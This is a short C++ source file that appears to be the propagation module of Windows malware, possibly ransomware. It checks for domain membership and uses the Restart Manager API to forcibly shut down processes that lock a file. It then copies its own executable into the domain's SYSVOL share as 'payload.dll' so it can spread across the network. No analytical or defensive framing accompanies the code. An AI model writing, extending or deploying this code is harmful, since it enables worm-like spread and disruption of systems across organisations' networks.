#include "spread.h"
#include <windows.h>
#include <restartmanager.h>
#include <lm.h>
#include <stdio.h>

#pragma comment(lib, "rstrtmgr.lib")
#pragma comment(lib, "netapi32.lib")

bool is_domain_joined() {
    NETSETUP_JOIN_STATUS status;
    LPWSTR name = nullptr;
    NetGetJoinInformation(NULL, &name, &status);
    if (name) NetApiBufferFree(name);
    return status == NetSetupDomainName;
}

void unlock_file_via_restart_manager(const wchar_t* path) {
    DWORD session;
    WCHAR key[CCH_RM_SESSION_KEY + 1] = {};
    if (RmStartSession(&session, 0, key) != ERROR_SUCCESS) return;

    RmRegisterResources(session, 1, &path, 0, NULL, 0, NULL);

    UINT needed = 10, got = 10;
    RM_PROCESS_INFO procs[10];
    RmGetList(session, &needed, &got, procs, NULL);
    RmShutdown(session, RmForceShutdown, NULL);
    RmEndSession(session);
}

void spread_via_gpo() {
    if (!is_domain_joined()) return;

    wchar_t sysvol[MAX_PATH] = {};
    GetEnvironmentVariableW(L"LOGONSERVER", sysvol, MAX_PATH);
    wcscat_s(sysvol, L"\\SYSVOL");

    wchar_t dest[MAX_PATH];
    swprintf_s(dest, MAX_PATH, L"%s\\payload.dll", sysvol);

    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    CopyFileW(self, dest, FALSE);
}
